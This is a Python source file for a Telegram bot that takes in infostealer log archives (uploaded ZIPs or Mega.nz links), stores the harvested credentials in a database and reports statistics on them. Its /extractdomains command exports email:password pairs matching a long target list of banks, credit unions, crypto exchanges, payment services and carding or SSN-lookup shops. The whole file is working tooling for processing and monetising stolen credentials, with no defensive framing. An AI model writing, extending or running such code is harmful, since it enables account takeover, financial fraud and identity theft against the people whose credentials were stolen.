#!/usr/bin/env python3
"""
Telegram Bot for receiving and processing stealer log files
"""
import os
import logging
import asyncio
from pathlib import Path
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from sqlalchemy import func
from app.database import SessionLocal
from app.models import Credential, Device, Upload
from app.services.zip_ingestion import ZipIngestionService

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration from environment
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
ALLOWED_USER_ID = int(os.getenv('TELEGRAM_ALLOWED_USER_ID', '0'))
UPLOAD_DIR = Path(os.getenv('UPLOAD_DIR', 'backend/data/incoming/uploads'))

# Ensure upload directory exists
UPLOAD_DIR.mkdir(parents=True, exist_ok=True)


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command with comprehensive statistics"""
    user_id = update.effective_user.id
    
    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("⛔ Unauthorized access denied.")
        logger.warning(f"Unauthorized access attempt from user {user_id}")
        return
    
    # Get database statistics
    db = SessionLocal()
    try:
        # Get total counts
        total_credentials = db.query(func.count(Credential.id)).scalar() or 0
        total_systems = db.query(func.count(Device.device_id)).scalar() or 0
        total_uploads = db.query(func.count(Upload.upload_id)).scalar() or 0
        
        # Get unique domains count
        unique_domains = db.query(func.count(func.distinct(Credential.domain))).scalar() or 0
        
        # Get top 100 domains
        top_domains = db.query(
            Credential.domain,
            func.count(Credential.id).label('count')
        ).group_by(
            Credential.domain
        ).order_by(
            func.count(Credential.id).desc()
        ).limit(100).all()
        
        # Format top domains list
        top_domains_text = ""
        for i, (domain, count) in enumerate(top_domains[:20], 1):  # Show top 20 in message
            top_domains_text += f"{i}. {domain} - {count:,}\n"
        
        if len(top_domains) > 20:
            top_domains_text += f"\n... and {len(top_domains) - 20} more domains"
        
        # Count pending ZIP files
        zip_files = list(UPLOAD_DIR.glob("*.zip"))
        
        # Build comprehensive message
        message = (
            "🤖 *Snatchbase Log Processor Bot*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            
            "📊 *DATABASE STATISTICS*\n"
            f"🔑 Total Credentials: {total_credentials:,}\n"
            f"🖥️ Total Systems: {total_systems:,}\n"
            f"📦 Total Uploads: {total_uploads:,}\n"
            f"🌐 Unique Domains: {unique_domains:,}\n"
            f"📁 Pending Files: {len(zip_files)}\n\n"
            
            "📈 *TOP 20 DOMAINS*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{top_domains_text}\n"
            
            "⚙️ *COMMANDS*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "/start - Show statistics\n"
            "/status - Check bot status\n"
            "/top100 - Show top 100 domains\n\n"
            
            "📤 *SEND FILES*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Send me ZIP files or Mega.nz links with logs:\n"
            "✅ Upload ZIP files directly\n"
            "✅ Paste Mega.nz download links\n"
            "✅ Auto-process and extract credentials\n"
            "✅ Auto-delete ZIP files after processing\n"
        )
        
        await update.message.reply_text(message, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"Error getting statistics: {str(e)}", exc_info=True)
        await update.message.reply_text(
            "🤖 *Snatchbase Log Processor Bot*\n\n"
            "Send me ZIP files containing stealer logs and I'll:\n"
            "✅ Save them to the upload directory\n"
            "✅ Process and extract credentials\n"
            "✅ Delete the ZIP files after processing\n\n"
            "Commands:\n"
            "/start - Show this message\n"
            "/status - Check bot status",
            parse_mode='Markdown'
        )
    finally:
        db.close()


async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /status command"""
    user_id = update.effective_user.id
    
    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("⛔ Unauthorized access denied.")
        return
    
    # Count files in upload directory
    zip_files = list(UPLOAD_DIR.glob("*.zip"))
    
    await update.message.reply_text(
        f"✅ *Bot Status*\n\n"
        f"📁 Upload Directory: `{UPLOAD_DIR}`\n"
        f"📦 ZIP Files Pending: {len(zip_files)}\n"
        f"🤖 Status: Active",
        parse_mode='Markdown'
    )


async def top100_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /top100 command to show top 100 domains"""
    user_id = update.effective_user.id
    
    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("⛔ Unauthorized access denied.")
        return
    
    db = SessionLocal()
    try:
        # Get top 100 domains
        top_domains = db.query(
            Credential.domain,
            func.count(Credential.id).label('count')
        ).group_by(
            Credential.domain
        ).order_by(
            func.count(Credential.id).desc()
        ).limit(100).all()
        
        if not top_domains:
            await update.message.reply_text("No domains found in database.")
            return
        
        # Split into multiple messages (Telegram has message length limit)
        message_parts = []
        current_message = "📊 *TOP 100 DOMAINS*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        
        for i, (domain, count) in enumerate(top_domains, 1):
            line = f"{i}. {domain} - {count:,}\n"
            
            # If message gets too long, start a new one
            if len(current_message + line) > 4000:
                message_parts.append(current_message)
                current_message = f"*TOP 100 DOMAINS (continued)*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n{line}"
            else:
                current_message += line
        
        # Add the last part
        if current_message:
            message_parts.append(current_message)
        
        # Send all message parts
        for part in message_parts:
            await update.message.reply_text(part, parse_mode='Markdown')
            
    except Exception as e:
        logger.error(f"Error getting top domains: {str(e)}", exc_info=True)
        await update.message.reply_text(f"❌ Error retrieving top domains: {str(e)}")
    finally:
        db.close()


async def extractdomains_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /extractdomains command to extract credentials from specific domains"""
    user_id = update.effective_user.id
    
    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("⛔ Unauthorized access denied.")
        return
    
    # Target domains list
    target_domains = [
        "yahoo.com", "afcu", "navy", "login.microsoftonline.com", "att.net", "sbcglobal.net",
        "bellsouth.net", "airbnb.com", "fidelity.com", "t-mobile.com", "att", "comcast",
        "spectrum", "verizon", "secure.bankofamerica.com", "edu", "verified.capitalone.com",
        "netflix.com", "login.live.com", "seed", "outlook.com", "outlook.office.com", "zoho",
        "ionos", "smtp", "webmail", "cu", "bank", "bluebird", "cash.app", "proxyscrape.com",
        "chime", "go2bank.com", "privateinternetaccess.com", "remitly.com", "blackpass.biz",
        "dichvusocks.net", "dichvusocks.us", "piaproxy.com", "xoom.com", "worldremit.com",
        "cashapp.com", "veem.com", "varo.com", "booking.com", "expedia.com", "bestbuy.com",
        "target.com", "ebay.com", "westernunion.com", "coinbase.com", "affirm.com", "ulta.com",
        "priceline.com", "netspend.com", "rbcroyalbank.com", "chase.com", "citi.com",
        "wellsfargo.com", "bankofamerica.com", "usbank.com", "pnc.com", "tdameritrade.com",
        "capitalone.com", "bbvausa.com", "bbt.com", "hsbc.com", "tiaa.org", "regions.com",
        "truist.com", "ally.com", "discover.com", "deutschebank.us", "citizensbank.com",
        "synchrony.com", "citizensbankonline.com", "key.com", "firstrepublic.com", "zionsbank.com",
        "53.com", "firstcitizens.com", "bbvacompass.com", "morganstanley.com", "us.hsbc.com",
        "ubs.com", "bankofthewest.com", "svb.com", "astoriafederal.com", "everbank.com",
        "fifththird.com", "activobank.com", "bancorpsouthonline.com", "cimm2.com", "bokfinancial.com",
        "easternbank.com", "bbtc.com", "compassbank.com", "banksouthern.com", "boh.com",
        "firsttennessee.com", "bankofhawaii.com", "qnbtrust.com", "syb.com", "jssb.com",
        "umb.com", "firstmidwest.com", "psecreditunion.org", "chemicalbankmi.com", "heritagesouthbank.com",
        "pacificwesternbank.com", "securitywall.com", "mfs-group.com", "macatawabank.com",
        "flagstar.com", "trustbank.net", "nationalbank.co.uk", "ndbt.com", "wsfsbank.com",
        "rocklandtrust.com", "gatewayfunding.com", "flsimple.com", "trustco.com", "bankuniteddirect.com",
        "cornerstoneconnect.com", "cpfg.com", "bankingwithsterling.com", "svbg.com", "hbtbank.com",
        "labettebank.com", "northpointe.com", "lakecitybank.com", "iberiabank.com", "abtbank.com",
        "pnfp.com", "modernbank.com", "sbsu.com", "rmcg.com", "barclaycardus.com", "myfirstambank.com",
        "derbystategroup.com", "merrilllynch.com", "unitybank.com", "intellichoice.com", "tgcbtrny.com",
        "first-online.com", "greerstatebank.com", "fcbresource.com", "premierbankinc.com",
        "kiwibank.com", "firstsavingsbanks.com", "crescombank.com", "cboprf.com", "bankvnb.com",
        "ucbbank.com", "vantagesouth.com", "flcb.com", "cblobaltrade.com", "myswissinternationalbank.com",
        "1stcolonial.com", "zitibank.com", "community1.com", "bemg.us", "lexingtonstatebank.com",
        "navyfederal.org", "alliantcreditunion.org", "penfed.org", "becu.org", "schoolsfirstfcu.org",
        "golden1.com", "dcu.org", "sefcu.com", "patelco.org", "sccu.com", "bevocu.org",
        "rbfcu.org", "dofcu.org", "redfcu.org", "pelicanstatecu.com", "oecu.org", "nymcu.org",
        "vystarcu.org", "digitalfcu.org", "wingsfinancial.com", "securityservicefcu.org",
        "alaskausa.org", "tinkerfcu.org", "wesbanco.com", "allegacy.org", "msufcu.org",
        "onpointcu.com", "northwest.ca", "psecu.com", "hfcu.info", "american1cu.org",
        "ufirstcu.com", "ent.com", "genisyscu.org", "gncu.org", "idahounited.org",
        "nefcu.com", "knoxvillepostalcu.org", "ovbc.com", "safeamerica.com", "cacu.com",
        "aacreditunion.org", "nihfcu.org", "abecu.org", "ascend.org", "texell.org",
        "redwoodcu.org", "faaecu.org", "michiganfirst.com", "uccumo.com", "mfcu.net",
        "deltacommunitycu.com", "fourpointsfcu.org", "desertschools.org", "ttcu.com",
        "mountainamericacu.org", "honorcu.com", "cufcu.org", "sfcu.org", "onecu.org",
        "hhfcu.org", "weokie.org", "gulfcoastfcu.org", "evfcu.org", "scu.org",
        "seattlecu.com", "mscu.net", "northwestcommunity.org", "hvcu.org", "northlandcu.com",
        "allegius.org", "uwcu.org", "lanecounty.org", "affcu.org", "horizoncu.com",
        "uwcreditunion.com", "denalifcu.org", "slcu.com", "smcu.com", "gnucfcu.com",
        "eecu.org", "fundome.org", "qsidefcu.org", "sempervalensfcu.com", "metrumcu.org",
        "genesee.coop", "solvaybank.com", "swayne.com", "netbranch.appletree.us", "winnco.org",
        "myncu.com", "alleganyfirst.com", "bvcu.org", "boots.coop", "silverstatecu.com",
        "educationfirstfcu.org", "southwest66.com", "cencap.com", "viscositycu.com", "gcefcu.coop",
        "epiphany.coop", "unitedsecuritybank.com", "coastccu.org", "fire-police.com", "mountaincu.org",
        "southbridgecu.com", "bondcu.com", "binance.com", "kraken.com", "bitfinex.com",
        "bittrex.com", "huobi.com", "kucoin.com", "ftx.com", "gemini.com", "bitstamp.net",
        "gate.io", "okex.com", "coinex.com", "bybit.com", "etoro.com", "poloniex.com",
        "hitbtc.com", "coinbene.com", "bitmax.io", "upbit.com", "bitmart.com", "probit.com",
        "coinone.co.kr", "bibox.com", "liquid.com", "zb.com", "lbank.info", "bitso.com",
        "exmo.com", "coincheck.com", "stex.com", "cointiger.com", "mercatox.com", "oceanex.pro",
        "indodax.com", "coinsbit.io", "wazirx.com", "bit-z.com", "bitumbs.com", "livecoin.net",
        "bithumb.com", "coinbit.co.kr", "digifinex.com", "crex24.com", "coinegg.com",
        "hotbit.io", "coinfalcon.com", "satoexchange.com", "fatbtc.com", "coinexmarket.io",
        "cex.io", "xt.com", "bitbank.cc", "coinfinit.com", "lykke.com", "novadax.com",
        "coinfloor.co.uk", "bitvavo.com", "bitflyer.com", "btse.com", "coins.ph",
        "coinrail.co.kr", "acx.io", "biki.com", "btcmarkets.net", "allcoin.com",
        "cobinhood.com", "okcoin.com", "coinjar.com", "bitonic.nl", "omgfin.com",
        "pro.liquid.com", "coinnest.co.kr", "zebpay.com", "coinspot.com.au", "gatecoin.com",
        "bitbay.net", "simex.global", "coindcx.com", "coinmate.io", "uniswap.org",
        "pancakeswap.finance", "sushiswap.fi", "polkaswap.io", "curve.fi", "1inch.exchange",
        "aave.com", "compound.finance", "yearn.finance", "balancer.finance", "synthetix.io",
        "makerdao.com", "v2.uniswap.org", "renproject.io", "kyber.network", "chain.link",
        "augur.net", "bancor.network", "loopring.org", "paypal.com", "po.trade",
        "deltafx.com", "octafx.com", "avatrade.com", "etrade.com", "iqoption.com",
        "interactivebrokers.com", "webull.com", "tradestation.com", "zackstrade.com",
        "tastyworks.com", "schwab.com", "fxpro.com", "olymptrade.com", "alpariforex.org",
        "pipl.com", "instantcheckmate.com", "truthfinder.com", "intelius.com", "beenverified.com",
        "spyfly.com", "easydeals.gs", "bigmoney.vn", "bankomat.sc", "zela.pw", "pp24.ws",
        "entershop.st", "bestvalid.ch", "realandrare.to", "flyded.gs", "mc-store.at",
        "premiuminfo.cc", "shalom.ninja", "crd2.life", "thebulldog.vip", "epicmarket.pw",
        "911.re", "topsocks", "faceless", "LUXSOCKS", "fullzinfo.pw", "850score.biz",
        "ssndob.cc", "ssndob.club", "scanlab.cc", "ssn24.me", "orders.bz", "luxchecker",
        "robocheck", "fullzstore", "blackpass", "basetools", "autofications", "doc-shopws",
        "uklookups.pro", "findme.cm", "floodcmr.net", "fspros.info", "infodig.is",
        "3389rdp.com", "paxful.com"
    ]
    
    await update.message.reply_text("🔄 Extracting credentials from target domains... This may take a moment.")
    
    db = SessionLocal()
    try:
        # Create temporary file to store results
        import tempfile
        from datetime import datetime
        
        temp_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt', encoding='utf-8')
        temp_path = temp_file.name
        
        total_extracted = 0
        domain_counts = {}
        
        # Query credentials for each domain
        for domain in target_domains:
            # Query with LIKE to match partial domains
            credentials = db.query(Credential).filter(
                Credential.domain.ilike(f'%{domain}%')
            ).all()
            
            if credentials:
                domain_counts[domain] = len(credentials)
                for cred in credentials:
                    # Write in email:password format
                    if cred.username and cred.password:
                        temp_file.write(f"{cred.username}:{cred.password}\n")
                        total_extracted += 1
        
        temp_file.close()
        
        if total_extracted == 0:
            await update.message.reply_text("❌ No credentials found for the specified domains.")
            import os
            os.unlink(temp_path)
            return
        
        # Create summary message
        summary = f"✅ *Extraction Complete*\n\n"
        summary += f"📊 Total credentials extracted: {total_extracted:,}\n"
        summary += f"🎯 Domains matched: {len(domain_counts)}\n\n"
        summary += f"*Top domains found:*\n"
        
        # Show top 10 domains by count
        sorted_domains = sorted(domain_counts.items(), key=lambda x: x[1], reverse=True)[:10]
        for domain, count in sorted_domains:
            summary += f"• {domain}: {count:,}\n"
        
        await update.message.reply_text(summary, parse_mode='Markdown')
        
        # Send the file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"extracted_credentials_{timestamp}.txt"
        
        with open(temp_path, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=filename,
                caption=f"📁 {total_extracted:,} credentials from {len(domain_counts)} domains"
            )
        
        # Clean up temp file
        import os
        os.unlink(temp_path)
        
        logger.info(f"Extracted {total_extracted} credentials for user {user_id}")
        
    except Exception as e:
        logger.error(f"Error extracting domains: {str(e)}", exc_info=True)
        await update.message.reply_text(f"❌ Error extracting credentials: {str(e)}")
    finally:
        db.close()


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file uploads"""
    user_id = update.effective_user.id
    
    # Check authorization
    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("⛔ Unauthorized access denied.")
        logger.warning(f"Unauthorized file upload attempt from user {user_id}")
        return
    
    document = update.message.document
    file_name = document.file_name
    
    # Only accept ZIP files
    if not file_name.lower().endswith('.zip'):
        await update.message.reply_text(
            "❌ Only ZIP files are accepted!\n"
            "Please send a ZIP file containing stealer logs."
        )
        return
    
    try:
        # Send processing message
        processing_msg = await update.message.reply_text(
            f"⏳ Downloading `{file_name}`...",
            parse_mode='Markdown'
        )
        
        # Download file
        file = await context.bot.get_file(document.file_id)
        file_path = UPLOAD_DIR / file_name
        await file.download_to_drive(file_path)
        
        logger.info(f"Downloaded file: {file_name} ({document.file_size} bytes)")
        
        # Update message
        await processing_msg.edit_text(
            f"✅ Downloaded `{file_name}`\n"
            f"⏳ Processing ZIP file...",
            parse_mode='Markdown'
        )
        
        # Process the ZIP file
        db = SessionLocal()
        try:
            ingestion_service = ZipIngestionService(logger=logger)
            result = ingestion_service.process_zip_file(file_path, db)
            
            if result['success']:
                # Delete ZIP file after successful processing
                if file_path.exists():
                    file_path.unlink()
                    logger.info(f"Deleted processed ZIP file: {file_name}")
                
                # Send success message
                await processing_msg.edit_text(
                    f"✅ *Processing Complete*\n\n"
                    f"📦 File: `{file_name}`\n"
                    f"🖥️ Devices: {result['devices_processed']}\n"
                    f"🔑 Credentials: {result['total_credentials']}\n"
                    f"📄 Files: {result['total_files']}\n"
                    f"🗑️ ZIP file deleted",
                    parse_mode='Markdown'
                )
                
                logger.info(
                    f"Successfully processed {file_name}: "
                    f"{result['devices_processed']} devices, "
                    f"{result['total_credentials']} credentials"
                )
            else:
                await processing_msg.edit_text(
                    f"❌ *Processing Failed*\n\n"
                    f"File: `{file_name}`\n"
                    f"Error: Processing unsuccessful",
                    parse_mode='Markdown'
                )
                logger.error(f"Failed to process {file_name}")
                
        except Exception as e:
            logger.error(f"Error processing {file_name}: {str(e)}", exc_info=True)
            await processing_msg.edit_text(
                f"❌ *Error Processing File*\n\n"
                f"File: `{file_name}`\n"
                f"Error: {str(e)}",
                parse_mode='Markdown'
            )
        finally:
            db.close()
            
    except Exception as e:
        logger.error(f"Error handling document: {str(e)}", exc_info=True)
        await update.message.reply_text(
            f"❌ Error downloading file: {str(e)}"
        )


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages, including Mega.nz links"""
    user_id = update.effective_user.id
    
    if user_id != ALLOWED_USER_ID:
        return
    
    message_text = update.message.text
    
    # Check if message contains a Mega.nz link
    import re
    mega_pattern = r'https?://mega\.nz/[^\s]+'
    mega_links = re.findall(mega_pattern, message_text)
    
    if mega_links:
        for link in mega_links:
            await download_mega_file(update, link)
    else:
        await update.message.reply_text(
            "📎 Please send me a ZIP file containing stealer logs or a Mega.nz link.\n"
            "Use /status to check the bot status."
        )


async def download_mega_file(update: Update, mega_url: str):
    """Download file from Mega.nz link"""
    try:
        # Send initial message
        status_msg = await update.message.reply_text(
            f"🔗 Detected Mega.nz link!\n"
            f"⏬ Starting download..."
        )
        
        # Generate unique filename for download
        import time
        timestamp = int(time.time())
        temp_filename = f"mega_{timestamp}"
        download_path = os.path.join(UPLOAD_DIR, temp_filename)
        
        # Download using megatools
        logger.info(f"Downloading from Mega.nz: {mega_url}")
        
        # Run megadl command
        import subprocess
        process = subprocess.Popen(
            ['megadl', '--path', UPLOAD_DIR, '--no-progress', mega_url],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = process.communicate()
        
        if process.returncode != 0:
            error_msg = stderr.strip() if stderr else "Unknown error"
            logger.error(f"Mega download failed: {error_msg}")
            await status_msg.edit_text(
                f"❌ Download failed!\n"
                f"Error: {error_msg}"
            )
            return
        
        # Find the downloaded file (megadl uses original filename)
        # Get the newest file in upload directory
        files = [f for f in os.listdir(UPLOAD_DIR) if os.path.isfile(os.path.join(UPLOAD_DIR, f))]
        if not files:
            await status_msg.edit_text("❌ Download failed! No file found.")
            return
        
        # Get the most recently modified file
        newest_file = max(files, key=lambda f: os.path.getmtime(os.path.join(UPLOAD_DIR, f)))
        file_path = os.path.join(UPLOAD_DIR, newest_file)
        file_size = os.path.getsize(file_path)
        file_size_mb = file_size / (1024 * 1024)
        
        logger.info(f"Downloaded: {newest_file} ({file_size_mb:.2f} MB)")
        
        # Update status message
        await status_msg.edit_text(
            f"✅ Download complete!\n\n"
            f"📁 File: {newest_file}\n"
            f"📊 Size: {file_size_mb:.2f} MB\n\n"
            f"🔄 The file will be automatically processed by the ingestion service.\n"
            f"⏱️ Processing time depends on file size."
        )
        
        logger.info(f"Mega.nz file downloaded successfully: {newest_file}")
        
    except Exception as e:
        logger.error(f"Error downloading Mega.nz file: {str(e)}")
        await update.message.reply_text(
            f"❌ Error downloading file:\n{str(e)}"
        )


def main():
    """Start the bot"""
    if not TELEGRAM_BOT_TOKEN:
        logger.error("TELEGRAM_BOT_TOKEN environment variable not set!")
        return
    
    if not ALLOWED_USER_ID:
        logger.error("TELEGRAM_ALLOWED_USER_ID environment variable not set!")
        return
    
    logger.info(f"Starting Telegram bot...")
    logger.info(f"Authorized user ID: {ALLOWED_USER_ID}")
    logger.info(f"Upload directory: {UPLOAD_DIR}")
    
    # Create application
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("top100", top100_command))
    application.add_handler(CommandHandler("extractdomains", extractdomains_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Start the bot
    logger.info("✅ Telegram bot is running...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
